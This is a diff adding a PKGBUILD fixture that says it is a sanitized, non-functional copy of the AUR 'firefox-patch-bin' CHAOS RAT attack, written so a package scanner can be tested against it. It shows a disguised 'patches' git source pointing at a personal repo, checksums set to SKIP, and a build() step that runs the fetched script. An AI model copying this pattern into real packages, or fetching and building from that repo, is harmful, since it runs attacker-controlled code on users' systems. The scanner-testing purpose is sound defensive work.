@@ -1,0 +1,28 @@
+# SANITIZED REPRODUCTION of the structure of the July 2025 AUR CHAOS RAT attack
+# (firefox-patch-bin / librewolf-fix-bin / zen-browser-patched-bin).
+# This is NOT functional malware — it only mimics the *shape* the scanner must
+# catch: a source=() entry disguised as "patches" that points at a personal
+# repo instead of genuine upstream, then executed during build.
+pkgname=firefox-patch-bin
+pkgver=1.0
+pkgrel=1
+pkgdesc="Firefox with extra security patches"
+arch=('x86_64')
+url="https://www.mozilla.org/firefox/"
+license=('MPL2')
+depends=('firefox')
+# The real upstream firefox sources would go here; instead an unrelated repo
+# is pulled in under an innocent-looking name.
+source=("firefox.tar.xz::https://ftp.mozilla.org/pub/firefox/releases/firefox.tar.xz"
+        "patches::git+https://github.com/danikpapas/zenbrowser-patch.git")
+sha256sums=('SKIP' 'SKIP')
+
+build() {
+  cd "$srcdir/patches"
+  # Executes attacker-controlled code fetched via the fake "patches" source.
+  ./apply-patch.sh
+}
+
+package() {
+  install -Dm755 "$srcdir/firefox" "$pkgdir/usr/bin/firefox"
+}
